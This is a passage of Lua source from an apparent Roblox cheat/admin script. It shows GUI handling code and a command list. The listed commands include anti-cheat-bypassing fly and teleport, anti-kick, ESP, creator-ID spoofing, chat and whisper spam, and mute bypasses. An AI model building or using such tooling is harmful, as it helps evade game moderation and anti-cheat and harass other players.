		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, 335), "InOut", "Quart", 0.5, true, nil)
		local function HighlightPart()
			if selected.Adornee ~= IYMouse.Target then
				selectionBox.Adornee = IYMouse.Target
			else
				selectionBox.Adornee = nil
			end
		end
		ActivateHighlight = IYMouse.Move:Connect(HighlightPart)
		local function SelectPart()
			if IYMouse.Target ~= nil then
				selected.Adornee = IYMouse.Target
				Path.Text = getHierarchy(IYMouse.Target)
			end
		end
		ClickSelect = IYMouse.Button1Down:Connect(SelectPart)
	end

	Part.MouseButton1Click:Connect(function()
		selectPart()
	end)

	Exit_4.MouseButton1Click:Connect(function()
		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		if ActivateHighlight then
			ActivateHighlight:Disconnect()
		end
		if ClickSelect then
			ClickSelect:Disconnect()
		end
		selectionBox.Adornee = nil
		selected.Adornee = nil
		Path.Text = ""
	end)

	CopyPath.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			toClipboard(Path.Text)
		else
			notify('Copy Path','Select a part to copy its path')
		end
	end)

	ChoosePart.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			local tpNameExt = ''
			local function handleWpNames()
				local FoundDupe = false
				for i,v in pairs(pWayPoints) do
					if v.NAME:lower() == selected.Adornee.Name:lower()..tpNameExt then
						FoundDupe = true
					end
				end
				if not FoundDupe then
					notify('Modified Waypoints',"Created waypoint: "..selected.Adornee.Name..tpNameExt)
					pWayPoints[#pWayPoints + 1] = {NAME = selected.Adornee.Name..tpNameExt, COORD = {selected.Adornee}}
				else
					if isNumber(tpNameExt) then
						tpNameExt = tpNameExt+1
					else
						tpNameExt = 1
					end
					handleWpNames()
				end
			end
			handleWpNames()
			refreshwaypoints()
		else
			notify('Part Selection','Select a part first')
		end
	end)

	cmds={}
	customAlias = {}
	Delete_3.MouseButton1Click:Connect(function()
		customAlias = {}
		aliases = {}
		notify('Aliases Modified','Removed all aliases')
		updatesaves()
		refreshaliases()
	end)

	PrefixBox:GetPropertyChangedSignal("Text"):Connect(function()
		prefix = PrefixBox.Text
		Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
		updatesaves()
	end)

	function CamViewport()
		if workspace.CurrentCamera then
			return workspace.CurrentCamera.ViewportSize.X
		end
	end

	function UpdateToViewport()
		if Holder.Position.X.Offset < -CamViewport() then
			Holder:TweenPosition(UDim2.new(1, -CamViewport(), Holder.Position.Y.Scale, Holder.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
			Notification:TweenPosition(UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
		end
	end
	CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)

	function updateCamera(child, parent)
		if parent ~= workspace then
			CamMoved:Disconnect()
			CameraChanged:Disconnect()
			repeat wait() until workspace.CurrentCamera
			CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)
			CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)
		end
	end
	CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)

	function dragMain(dragpoint,gui)
		task.spawn(function()
			local dragging
			local dragInput
			local dragStart = Vector3.new(0,0,0)
			local startPos
			local function update(input)
				local pos = -250
				local delta = input.Position - dragStart
				if startPos.X.Offset + delta.X <= -500 then
					local Position = UDim2.new(1, -250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
					pos = 250
				else
					local Position = UDim2.new(1, -500, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
					pos = -250
				end
				if startPos.X.Offset + delta.X <= -250 and -CamViewport() <= startPos.X.Offset + delta.X then
					local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, gui.Position.Y.Scale, gui.Position.Y.Offset)
					TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
					local Position2 = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X + pos, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
				elseif startPos.X.Offset + delta.X > -500 then
					local Position = UDim2.new(1, -250, gui.Position.Y.Scale, gui.Position.Y.Offset)
					TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
				elseif -CamViewport() > startPos.X.Offset + delta.X then
					gui:TweenPosition(UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
					local Position = UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset)
					TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
					local Position2 = UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					TweenService:Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
				end
			end
			dragpoint.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
			dragpoint.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end)
	end

	dragMain(Title,Holder)

	Match = function(name,str)
		str = str:gsub("%W", "%%%1")
		return name:lower():find(str:lower()) and true
	end

	local canvasPos = Vector2.new(0,0)
	local topCommand = nil
	IndexContents = function(str,bool,cmdbar,Ianim)
		CMDsF.CanvasPosition = Vector2.new(0,0)
		local SizeY = 0
		local indexnum = 0
		local frame = CMDsF
		topCommand = nil
		local chunks = {}
		if str:sub(#str,#str) == "\\" then str = "" end
		for w in string.gmatch(str,"[^\\]+") do
			table.insert(chunks,w)
		end
		if #chunks > 0 then str = chunks[#chunks] end
		if str:sub(1,1) == "!" then str = str:sub(2) end
		for i,v in next, frame:GetChildren() do
			if v:IsA("TextButton") then
				if bool then
					if Match(v.Text,str) then
						indexnum = indexnum + 1
						v.Visible = true
						if topCommand == nil then
							topCommand = v.Text
						end
					else
						v.Visible = false
					end
				else
					v.Visible = true
					if topCommand == nil then
						topCommand = v.Text
					end
				end
			end
		end
		frame.CanvasSize = UDim2.new(0,0,0,cmdListLayout.AbsoluteContentSize.Y)
		if not Ianim then
			if indexnum == 0 or string.find(str, " ") then
				if not cmdbar then
					minimizeHolder()
				elseif cmdbar then
					cmdbarHolder()
				end
			else
				maximizeHolder()
			end
		else
			minimizeHolder()
		end
	end

	PlayerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
	local chatbox
	task.spawn(function()
		local success, result = pcall(function() chatbox = game.WaitForChild(PlayerGui, "Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar end)
		if success then
			local function chatboxFocused()
				canvasPos = CMDsF.CanvasPosition
			end
			local chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)

			local function Index()
				if chatbox.Text:lower():sub(1,1) == prefix then
					if SettingsOpen == true then
						wait(0.2)
						CMDsF.Visible = true
						Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
					end
					IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2),true)
				else
					minimizeHolder()
					if SettingsOpen == true then
						wait(0.2)
						Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
						CMDsF.Visible = false
					end
				end
			end
			local chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)

			local function chatboxFocusLost(enterpressed)
				if not enterpressed or chatbox.Text:lower():sub(1,1) ~= prefix then
					IndexContents('',true)
				end
				CMDsF.CanvasPosition = canvasPos
				minimizeHolder()
			end
			local chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)

			PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.ChildAdded:Connect(function(newbar)
				wait()
				if newbar:FindFirstChild('BoxFrame') then
					chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
					if chatboxFocusedC then chatboxFocusedC:Disconnect() end
					chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)
					if chatboxFunc then chatboxFunc:Disconnect() end
					chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)
					if chatboxFocusLostC then chatboxFocusLostC:Disconnect() end
					chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)
				end
			end)
			--else
			--print('Custom chat detected. Will not provide suggestions for commands typed in the chat.')
		end
	end)

	function autoComplete(str,curText)
		local endingChar = {"[", "/", "(", " "}
		local stop = 0
		for i=1,#str do
			local c = str:sub(i,i)
			if table.find(endingChar, c) then
				stop = i
				break
			end
		end
		curText = curText or Cmdbar.Text
		local subPos = 0
		local pos = 1
		local findRes = string.find(curText,"\\",pos)
		while findRes do
			subPos = findRes
			pos = findRes+1
			findRes = string.find(curText,"\\",pos)
		end
		if curText:sub(subPos+1,subPos+1) == "!" then subPos = subPos + 1 end
		Cmdbar.Text = curText:sub(1,subPos) .. str:sub(1, stop - 1)..' '
		wait()
		Cmdbar.Text = Cmdbar.Text:gsub( '\t', '' )
		Cmdbar.CursorPosition = #Cmdbar.Text+1--1020
	end

	CMDs = {}
	CMDs[#CMDs + 1] = {NAME = 'discord / support / help', DESC = 'Invite to the Infinite Yield support server.'}
	CMDs[#CMDs + 1] = {NAME = 'console', DESC = 'Loads old Roblox console'}
	CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX by Moon'}
	CMDs[#CMDs + 1] = {NAME = 'olddex / odex', DESC = 'Opens Old DEX by Moon'}
	CMDs[#CMDs + 1] = {NAME = 'remotespy / rspy', DESC = 'Opens Simple Spy V3'}
	CMDs[#CMDs + 1] = {NAME = 'audiologger / alogger', DESC = 'Opens Edges audio logger'}
	CMDs[#CMDs + 1] = {NAME = 'serverinfo / info', DESC = 'Gives you info about the server'}
	CMDs[#CMDs + 1] = {NAME = 'jobid', DESC = 'Copies the games JobId to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'notifyjobid', DESC = 'Notifies you the games JobId'}
	CMDs[#CMDs + 1] = {NAME = 'rejoin / rj', DESC = 'Makes you rejoin the game'}
	CMDs[#CMDs + 1] = {NAME = 'autorejoin / autorj', DESC = 'Automatically rejoins the server if you get kicked/disconnected'}
	CMDs[#CMDs + 1] = {NAME = 'serverhop / shop', DESC = 'Teleports you to a different server'}
	CMDs[#CMDs + 1] = {NAME = 'joinplayer [username / ID] [place ID]', DESC = 'Joins a specific players server'}
	CMDs[#CMDs + 1] = {NAME = 'gameteleport / gametp [place ID]', DESC = 'Joins a game by ID'}
	CMDs[#CMDs + 1] = {NAME = 'antiidle / antiafk', DESC = 'Prevents the game from kicking you for being idle/afk'}
	CMDs[#CMDs + 1] = {NAME = 'datalimit [num]', DESC = 'Set outgoing KBPS limit'}
	CMDs[#CMDs + 1] = {NAME = 'replicationlag / backtrack [num]', DESC = 'Set IncomingReplicationLag'}
	CMDs[#CMDs + 1] = {NAME = 'creatorid / creator', DESC = 'Notifies you the creators ID'}
	CMDs[#CMDs + 1] = {NAME = 'copycreatorid / copycreator', DESC = 'Copies the creators ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'setcreatorid / setcreator', DESC = 'Sets your userid to the creators ID'}
	CMDs[#CMDs + 1] = {NAME = 'noprompts', DESC = 'Prevents the game from showing you purchase/premium prompts'}
	CMDs[#CMDs + 1] = {NAME = 'showprompts', DESC = 'Allows the game to show purchase/premium prompts again'}
	CMDs[#CMDs + 1] = {NAME = 'enable [inventory/playerlist/chat/reset/emotes/all]', DESC = 'Toggles visibility of coregui items'}
	CMDs[#CMDs + 1] = {NAME = 'disable [inventory/playerlist/chat/reset/emotes/all]', DESC = 'Toggles visibility of coregui items'}
	CMDs[#CMDs + 1] = {NAME = 'showguis', DESC = 'Shows any invisible GUIs'}
	CMDs[#CMDs + 1] = {NAME = 'unshowguis', DESC = 'Undoes showguis'}
	CMDs[#CMDs + 1] = {NAME = 'hideguis', DESC = 'Hides any GUIs in PlayerGui'}
	CMDs[#CMDs + 1] = {NAME = 'unhideguis', DESC = 'Undoes hideguis'}
	CMDs[#CMDs + 1] = {NAME = 'guidelete', DESC = 'Enables backspace to delete GUI'}
	CMDs[#CMDs + 1] = {NAME = 'unguidelete / noguidelete', DESC = 'Disables guidelete'}
	CMDs[#CMDs + 1] = {NAME = 'hideiy', DESC = 'Hides the main IY GUI'}
	CMDs[#CMDs + 1] = {NAME = 'showiy / unhideiy', DESC = 'Shows IY again'}
	CMDs[#CMDs + 1] = {NAME = 'keepiy', DESC = 'Auto execute IY when you teleport through servers'}
	CMDs[#CMDs + 1] = {NAME = 'unkeepiy', DESC = 'Disable keepiy'}
	CMDs[#CMDs + 1] = {NAME = 'togglekeepiy', DESC = 'Toggle keepiy'}
	CMDs[#CMDs + 1] = {NAME = 'savegame / saveplace', DESC = 'Uses saveinstance to save the game'}
	CMDs[#CMDs + 1] = {NAME = 'clearerror', DESC = 'Clears the annoying box and blur when a game kicks you'}
	CMDs[#CMDs + 1] = {NAME = 'clientantikick / antikick (CLIENT)', DESC = 'Prevents localscripts from kicking you'}
	CMDs[#CMDs + 1] = {NAME = 'clientantiteleport / antiteleport (CLIENT)', DESC = 'Prevents localscripts from teleporting you'}
	CMDs[#CMDs + 1] = {NAME = 'allowrejoin / allowrj [true/false] (CLIENT)', DESC = 'Changes if antiteleport allows you to rejoin or not'}
	CMDs[#CMDs + 1] = {NAME = 'cancelteleport / canceltp', DESC = 'Cancels teleports in progress'}
	CMDs[#CMDs + 1] = {NAME = 'volume / vol [0-10]', DESC = 'Adjusts your game volume on a scale of 0 to 10'}
	CMDs[#CMDs + 1] = {NAME = 'antilag / boostfps / lowgraphics', DESC = 'Lowers game quality to boost FPS'}
	CMDs[#CMDs + 1] = {NAME = 'record / rec', DESC = 'Starts roblox recorder'}
	CMDs[#CMDs + 1] = {NAME = 'screenshot / scrnshot', DESC = 'Takes a screenshot'}
	CMDs[#CMDs + 1] = {NAME = 'togglefullscreen / togglefs', DESC = 'Toggles fullscreen'}
	CMDs[#CMDs + 1] = {NAME = 'notify [text]', DESC = 'Sends you a notification with the provided text'}
	CMDs[#CMDs + 1] = {NAME = 'lastcommand / lastcmd', DESC = 'Executes the previous command used'}
	CMDs[#CMDs + 1] = {NAME = 'exit', DESC = 'Kills roblox process'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
	CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
	CMDs[#CMDs + 1] = {NAME = 'fly [speed]', DESC = 'Makes you fly'}
	CMDs[#CMDs + 1] = {NAME = 'unfly', DESC = 'Disables fly'}
	CMDs[#CMDs + 1] = {NAME = 'flyspeed [num]', DESC = 'Set fly speed (default is 20)'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclefly / vfly [speed]', DESC = 'Makes you fly in a vehicle'}
	CMDs[#CMDs + 1] = {NAME = 'unvehiclefly / unvfly', DESC = 'Disables vehicle fly'}
	CMDs[#CMDs + 1] = {NAME = 'vehicleflyspeed  / vflyspeed [num]', DESC = 'Set vehicle fly speed'}
	CMDs[#CMDs + 1] = {NAME = 'cframefly / cfly [speed]', DESC = 'Makes you fly, bypassing some anti cheats (works on mobile)'}
	CMDs[#CMDs + 1] = {NAME = 'uncframefly / uncfly', DESC = 'Disables cfly'}
	CMDs[#CMDs + 1] = {NAME = 'cframeflyspeed  / cflyspeed [num]', DESC = 'Sets cfly speed'}
	CMDs[#CMDs + 1] = {NAME = 'qefly [true / false]', DESC = 'enables or disables the Q and E hotkeys for fly'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclenoclip / vnoclip', DESC = 'Turns off vehicle collision'}
	CMDs[#CMDs + 1] = {NAME = 'vehicleclip / vclip / unvnoclip', DESC = 'Enables vehicle collision'}
	CMDs[#CMDs + 1] = {NAME = 'float /  platform', DESC = 'Spawns a platform beneath you causing you to float'}
	CMDs[#CMDs + 1] = {NAME = 'unfloat / noplatform', DESC = 'Removes the platform'}
	CMDs[#CMDs + 1] = {NAME = 'swim', DESC = 'Allows you to swim in the air'}
	CMDs[#CMDs + 1] = {NAME = 'unswim / noswim', DESC = 'Stops you from swimming everywhere'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'setwaypoint / swp [name]', DESC = 'Sets a waypoint at your position'}
	CMDs[#CMDs + 1] = {NAME = 'waypointpos / wpp [name] [X Y Z]', DESC = 'Sets a waypoint with specified coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'waypoints', DESC = 'Shows a list of currently active waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'showwaypoints / showwp', DESC = 'Shows all currently set waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'hidewaypoints / hidewp', DESC = 'Hides shown waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'waypoint / wp [name]', DESC = 'Teleports player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'tweenwaypoint / twp [name]', DESC = 'Tweens player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'walktowaypoint / wtwp [name]', DESC = 'Walks player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'deletewaypoint / dwp [name]', DESC = 'Deletes a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'clearwaypoints / cwp', DESC = 'Clears all waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'cleargamewaypoints / cgamewp', DESC = 'Clears all waypoints for the game you are in'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'goto [plr]', DESC = 'Go to a player'}
	CMDs[#CMDs + 1] = {NAME = 'tweengoto / tgoto [plr]', DESC = 'Tween to a player (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'tweenspeed / tspeed [num]', DESC = 'Sets how fast all tween commands go (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclegoto / vgoto [plr]', DESC = 'Go to a player while in a vehicle'}
	CMDs[#CMDs + 1] = {NAME = 'loopgoto [plr] [distance] [delay]', DESC = 'Loop teleport to a player'}
	CMDs[#CMDs + 1] = {NAME = 'unloopgoto', DESC = 'Stops teleporting you to a player'}
	CMDs[#CMDs + 1] = {NAME = 'pulsetp / ptp [plr] [seconds]', DESC = 'Teleports you to a player for a specified ammount of time'}
	CMDs[#CMDs + 1] = {NAME = 'clientbring / cbring [plr] (CLIENT)', DESC = 'Bring a player'}
	CMDs[#CMDs + 1] = {NAME = 'loopbring [plr] [distance] [delay] (CLIENT)', DESC = 'Loop brings a player to you (useful for killing)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopbring [plr]', DESC = 'Undoes loopbring'}
	CMDs[#CMDs + 1] = {NAME = 'freeze / fr [plr] (CLIENT)', DESC = 'Freezes a player'}
	CMDs[#CMDs + 1] = {NAME = 'freezeanims', DESC = 'Freezes your animations / pauses your animations - Does not work on default animations'}
	CMDs[#CMDs + 1] = {NAME = 'unfreezeanims', DESC = 'Unfreezes your animations / plays your animations'}
	CMDs[#CMDs + 1] = {NAME = 'thaw / unfr [plr] (CLIENT)', DESC = 'Unfreezes a player'}
	CMDs[#CMDs + 1] = {NAME = 'tpposition / tppos [X Y Z]', DESC = 'Teleports you to certain coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'tweentpposition / ttppos [X Y Z]', DESC = 'Tween to coordinates (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'offset [X Y Z]', DESC = 'Offsets you by certain coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'tweenoffset / toffset [X Y Z]', DESC = 'Tween offset (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'notifyposition / notifypos [plr]', DESC = 'Notifies you the coordinates of a character'}
	CMDs[#CMDs + 1] = {NAME = 'copyposition / copypos [plr]', DESC = 'Copies the coordinates of a character to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'walktoposition / walktopos [X Y Z]', DESC = 'Makes you walk to a coordinate'}
	CMDs[#CMDs + 1] = {NAME = 'spawnpoint / spawn [delay]', DESC = 'Sets a position where you will spawn'}
	CMDs[#CMDs + 1] = {NAME = 'nospawnpoint / nospawn', DESC = 'Removes your custom spawn point'}
	CMDs[#CMDs + 1] = {NAME = 'flashback / diedtp', DESC = 'Teleports you to where you last died'}
	CMDs[#CMDs + 1] = {NAME = 'walltp', DESC = 'Teleports you above/over any wall you run into'}
	CMDs[#CMDs + 1] = {NAME = 'nowalltp / unwalltp', DESC = 'Disables walltp'}
	CMDs[#CMDs + 1] = {NAME = 'teleporttool / tptool', DESC = 'Gives you a teleport tool'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'logs', DESC = 'Opens the logs GUI'}
	CMDs[#CMDs + 1] = {NAME = 'chatlogs / clogs', DESC = 'Log what people say or whisper'}
	CMDs[#CMDs + 1] = {NAME = 'joinlogs / jlogs', DESC = 'Log when people join'}
	CMDs[#CMDs + 1] = {NAME = 'chat / say [text]', DESC = 'Makes you chat a string (possible mute bypass)'}
	CMDs[#CMDs + 1] = {NAME = 'spam [text]', DESC = 'Makes you spam the chat'}
	CMDs[#CMDs + 1] = {NAME = 'unspam', DESC = 'Turns off spam'}
	CMDs[#CMDs + 1] = {NAME = 'whisper / pm [plr] [text]', DESC = 'Makes you whisper a string to someone (possible mute bypass)'}
	CMDs[#CMDs + 1] = {NAME = 'pmspam [plr] [text]', DESC = 'Makes you spam a players whispers'}
	CMDs[#CMDs + 1] = {NAME = 'unpmspam [plr]', DESC = 'Turns off pm spam'}
	CMDs[#CMDs + 1] = {NAME = 'spamspeed [num]', DESC = 'How quickly you spam (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'bubblechat (CLIENT)', DESC = 'Enables bubble chat for your client'}
	CMDs[#CMDs + 1] = {NAME = 'unbubblechat / nobubblechat', DESC = 'Disables the bubblechat command'}
	CMDs[#CMDs + 1] = {NAME = 'safechat', DESC = 'Enables safe chat'}
	CMDs[#CMDs + 1] = {NAME = 'nosafechat / disablesafechat', DESC = 'Disables safechat'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'esp', DESC = 'View all players and their status'}
	CMDs[#CMDs + 1] = {NAME = 'noesp / unesp', DESC = 'Removes esp'}
	CMDs[#CMDs + 1] = {NAME = 'esptransparency [number]', DESC = 'Changes the transparency of esp related commands'}
	CMDs[#CMDs + 1] = {NAME = 'partesp [part name]', DESC = 'Highlights a part'}
	CMDs[#CMDs + 1] = {NAME = 'unpartesp / nopartesp [part name]', DESC = 'removes partesp'}
	CMDs[#CMDs + 1] = {NAME = 'chams', DESC = 'ESP but without text in the way'}
	CMDs[#CMDs + 1] = {NAME = 'nochams / unchams', DESC = 'Removes chams'}
	CMDs[#CMDs + 1] = {NAME = 'locate [plr]', DESC = 'View a single player and their status'}
	CMDs[#CMDs + 1] = {NAME = 'unlocate / nolocate [plr]', DESC = 'Removes locate'}
	CMDs[#CMDs + 1] = {NAME = 'xray', DESC = 'Makes all parts in workspace transparent'}
	CMDs[#CMDs + 1] = {NAME = 'unxray / noxray', DESC = 'Restores transparency'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'spectate / view [plr]', DESC = 'View a player'}
	CMDs[#CMDs + 1] = {NAME = 'viewpart / viewp [part name]', DESC = 'View a part'}
	CMDs[#CMDs + 1] = {NAME = 'unspectate / unview', DESC = 'Stops viewing player'}
	CMDs[#CMDs + 1] = {NAME = 'freecam / fc', DESC = 'Allows you to freely move camera around the game'}
	CMDs[#CMDs + 1] = {NAME = 'freecampos / fcpos [X Y Z]', DESC = 'Moves / opens freecam in a certain position'}
	CMDs[#CMDs + 1] = {NAME = 'freecamwaypoint / fcwp [name]', DESC = 'Moves / opens freecam to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'freecamgoto / fcgoto / fctp [plr]', DESC = 'Moves / opens freecam to a player'}
	CMDs[#CMDs + 1] = {NAME = 'unfreecam / unfc', DESC = 'Disables freecam'}
	CMDs[#CMDs + 1] = {NAME = 'freecamspeed / fcspeed [num]', DESC = 'Adjusts freecam speed (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'notifyfreecamposition / notifyfcpos', DESC = 'Noitifies you your freecam coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'copyfreecamposition / copyfcpos', DESC = 'Copies your freecam coordinates to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'gotocamera / gotocam', DESC = 'Teleports you to the location of your camera'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotocam / tgotocam', DESC = 'Tweens you to the location of your camera'}
	CMDs[#CMDs + 1] = {NAME = 'firstp', DESC = 'Forces camera to go into first person'}
	CMDs[#CMDs + 1] = {NAME = 'thirdp', DESC = 'Allows camera to go into third person'}
	CMDs[#CMDs + 1] = {NAME = 'noclipcam / nccam', DESC = 'Allows camera to go through objects like walls'}
	CMDs[#CMDs + 1] = {NAME = 'maxzoom [num]', DESC = 'Maximum camera zoom'}
	CMDs[#CMDs + 1] = {NAME = 'minzoom [num]', DESC = 'Minimum camera zoom'}
	CMDs[#CMDs + 1] = {NAME = 'camdistance [num]', DESC = 'Changes camera distance from your player'}
	CMDs[#CMDs + 1] = {NAME = 'fov [num]', DESC = 'Adjusts field of view (default is 70)'}
	CMDs[#CMDs + 1] = {NAME = 'fixcam / restorecam', DESC = 'Fixes camera'}
	CMDs[#CMDs + 1] = {NAME = 'enableshiftlock / enablesl', DESC = 'Enables the shift lock option'}
	CMDs[#CMDs + 1] = {NAME = 'lookat [plr]', DESC = 'Moves your camera view to a player'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'btools (CLIENT)', DESC = 'Gives you building tools (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'f3x (CLIENT)', DESC = 'Gives you F3X building tools (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'partname / partpath', DESC = 'Allows you to click a part to see its path & name'}
	CMDs[#CMDs + 1] = {NAME = 'delete [instance name] (CLIENT)', DESC = 'Removes any part with a certain name from the workspace (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'deleteclass / dc [class name] (CLIENT)', DESC = 'Removes any part with a certain classname from the workspace (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'lockworkspace / lockws', DESC = 'Locks the whole workspace'}
	CMDs[#CMDs + 1] = {NAME = 'unlockworkspace / unlockws', DESC = 'Unlocks the whole workspace'}
	CMDs[#CMDs + 1] = {NAME = 'invisibleparts / invisparts (CLIENT)', DESC = 'Shows invisible parts'}
	CMDs[#CMDs + 1] = {NAME = 'uninvisibleparts / uninvisparts (CLIENT)', DESC = 'Makes parts affected by invisparts return to normal'}
	CMDs[#CMDs + 1] = {NAME = 'deleteinvisparts / dip (CLIENT)', DESC = 'Deletes invisible parts'}
	CMDs[#CMDs + 1] = {NAME = 'gotopart [part name]', DESC = 'Moves your character to a part or multiple parts'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotopart / tgotopart [part name]', DESC = 'Tweens your character to a part or multiple parts'}
	CMDs[#CMDs + 1] = {NAME = 'gotopartclass / gpc [class name]', DESC = 'Moves your character to a part or multiple parts based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotopartclass / tgpc [class name]', DESC = 'Tweens your character to a part or multiple parts based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'gotomodel [part name]', DESC = 'Moves your character to a model or multiple models'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotomodel / tgotomodel [part name]', DESC = 'Tweens your character to a model or multiple models'}
	CMDs[#CMDs + 1] = {NAME = 'gotopartdelay / gotomodeldelay [num]', DESC = 'Adjusts how quickly you teleport to each part (default is 0.1)'}
	CMDs[#CMDs + 1] = {NAME = 'bringpart [part name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character'}
	CMDs[#CMDs + 1] = {NAME = 'bringpartclass / bpc [class name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'noclickdetectorlimits / nocdlimits', DESC = 'Sets all click detectors MaxActivationDistance to math.huge'}
	CMDs[#CMDs + 1] = {NAME = 'fireclickdetectors / firecd [name]', DESC = 'Uses all click detectors in a game or uses the optional name'}
	CMDs[#CMDs + 1] = {NAME = 'firetouchinterests / touchinterests [name]', DESC = 'Uses all touchinterests in a game or uses the optional name'}
	CMDs[#CMDs + 1] = {NAME = 'noproximitypromptlimits / nopplimits', DESC = 'Sets all proximity prompts MaxActivationDistance to math.huge'}
